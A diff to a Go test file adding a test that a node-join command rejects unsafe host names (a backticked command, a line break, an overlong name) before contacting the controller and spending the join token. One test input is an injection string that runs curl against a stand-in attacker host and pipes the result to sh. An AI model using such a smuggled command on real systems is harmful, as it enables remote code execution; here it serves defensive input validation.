@@ -331,3 +331,55 @@ func TestReportedSizeSaysWhatTheAgentMeasuredOrThatItCouldNot(t *testing.T) {
 		})
 	}
 }
+
+// A name the controller would refuse is found out here, before the controller
+// is contacted. Left to the controller the join is still refused and the token
+// still unspent, but the answer arrives as a 422 the agent reads as a rejected
+// join token, and the operator is told to mint another for a token that was
+// never the trouble.
+func TestJoinRefusesAHostNameTheControllerWouldRefuseBeforeContactingIt(t *testing.T) {
+	for name, host := range map[string]string{
+		"backticks around a command": "a`curl evil.example|sh`b",
+		"a line break":               "two\nlines",
+		"a paragraph":                strings.Repeat("a", 129),
+	} {
+		t.Run(name, func(t *testing.T) {
+			var contacted atomic.Int32
+			srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+				contacted.Add(1)
+				http.Error(w, "no", http.StatusUnauthorized)
+			}))
+			t.Cleanup(srv.Close)
+
+			stateDir := t.TempDir()
+			err := Join(context.Background(), JoinOptions{
+				ControllerURL:     srv.URL,
+				JoinToken:         "zoojoin_test",
+				Name:              host,
+				ConfigDir:         t.TempDir(),
+				StateDir:          stateDir,
+				Service:           ServiceNone,
+				AllowInsecureHTTP: true,
+				Out:               &strings.Builder{},
+				detection:         &Detection{OS: "linux", Arch: "amd64", Hostname: "build-01"},
+			})
+			if err == nil {
+				t.Fatalf("a join as %q went ahead", host)
+			}
+			for _, want := range []string{"--name", "nothing has been redeemed"} {
+				if !strings.Contains(err.Error(), want) {
+					t.Errorf("the refusal should mention %q:\n%v", want, err)
+				}
+			}
+			if strings.Contains(err.Error(), "evil.example") {
+				t.Errorf("the refusal repeats the name it refuses: %v", err)
+			}
+			if n := contacted.Load(); n != 0 {
+				t.Errorf("the controller was contacted %d times; that spends the single-use join token", n)
+			}
+			if _, statErr := os.Stat(filepath.Join(stateDir, "work")); statErr == nil {
+				t.Error("nothing should be written before the refusal")
+			}
+		})
+	}
+}
